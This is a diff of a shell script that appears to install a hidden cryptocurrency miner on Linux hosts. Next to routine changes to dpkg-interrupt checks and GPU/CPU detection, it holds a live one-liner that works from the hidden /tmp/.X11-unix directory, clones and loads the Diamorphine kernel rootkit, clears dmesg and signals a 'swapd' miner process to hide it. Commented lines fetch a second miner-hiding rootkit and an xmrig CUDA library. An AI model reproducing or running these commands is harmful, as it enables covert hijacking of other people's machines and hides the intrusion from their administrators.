@@ -109,25 +109,33 @@ if command -v dpkg >/dev/null 2>&1; then
     # Check if dpkg was interrupted
     DPKG_INTERRUPTED=false
     
-    # Method 1: Check dpkg status
-    if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured\|half-installed"; then
+    # Method 1: Check dpkg status (ONLY packages with actual problems)
+    if dpkg --audit 2>&1 | grep -qE "half-configured|half-installed|unpacked.*not configured"; then
         DPKG_INTERRUPTED=true
-        echo "[!] DPKG interrupt detected (dpkg --audit shows issues)"
+        echo "[!] DPKG interrupt detected (dpkg --audit shows half-configured packages)"
     fi
     
-    # Method 2: Check for error message
-    if apt-get check 2>&1 | grep -qi "dpkg was interrupted"; then
+    # Method 2: Check apt-get for ACTUAL errors (not just warnings)
+    if apt-get check 2>&1 | grep -qE "dpkg was interrupted.*must manually run|You must.*dpkg --configure"; then
         DPKG_INTERRUPTED=true
-        echo "[!] DPKG interrupt detected (apt-get check shows error)"
+        echo "[!] DPKG interrupt detected (apt-get check shows actual interrupt)"
     fi
     
-    # Method 3: Check lock files
+    # Method 3: Check lock files ONLY if process is stuck
     if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
+        # Only consider it interrupted if lock file exists AND process is stuck
         if lsof /var/lib/dpkg/lock 2>/dev/null | grep -q dpkg; then
-            echo "[!] DPKG is currently running (locked)"
-        elif [ -f /var/lib/dpkg/status-old ]; then
+            # Process is actually running - not interrupted, just busy
+            echo "[*] DPKG is currently running (locked by active process)"
+            DPKG_INTERRUPTED=false
+        elif pgrep -x "dpkg\|apt-get\|apt\|aptitude" >/dev/null 2>&1; then
+            # Package manager is running - not interrupted
+            echo "[*] Package manager is currently running"
+            DPKG_INTERRUPTED=false
+        elif [ -f /var/lib/dpkg/status-old ] && [ -f /var/lib/dpkg/lock ]; then
+            # Lock file exists, no process, and backup status exists = interrupted
             DPKG_INTERRUPTED=true
-            echo "[!] DPKG may have been interrupted (old status file exists)"
+            echo "[!] DPKG may have been interrupted (stale lock with no process)"
         fi
     fi
     
@@ -2354,18 +2362,31 @@ echo "[*] #Installing r00tkit(z)"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y --force-yes ; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] Determining GPU+CPU (without lshw)"
+safe_yum install pciutils -y
+apt-get install pciutils -y --force-yes
+update-pciids
+lspci -vs 00:01.0
+nvidia-smi
+aticonfig --odgc --odgt
+nvtop -s  # Non-interactive mode
+radeontop
+echo "Possible CPU Threads:"
+(nproc)
+#cd "$HOME"/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
+
+echo "[*] Determining GPU+CPU"
 safe_yum install msr-tools pciutils lshw -y
 apt-get install msr-tools pciutils lshw -y --force-yes
 zypper install msrtools pciutils lshw -y
 update-pciids
 lspci -vs 00:01.0
+lshw -C display
 nvidia-smi
 aticonfig --odgc --odgt
-nvtop -s
+nvtop -s  # Non-interactive mode
 radeontop
 echo "Possible CPU Threads:"
 (nproc)
-#cd "$HOME"/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
 
 #echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y --force-yes ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
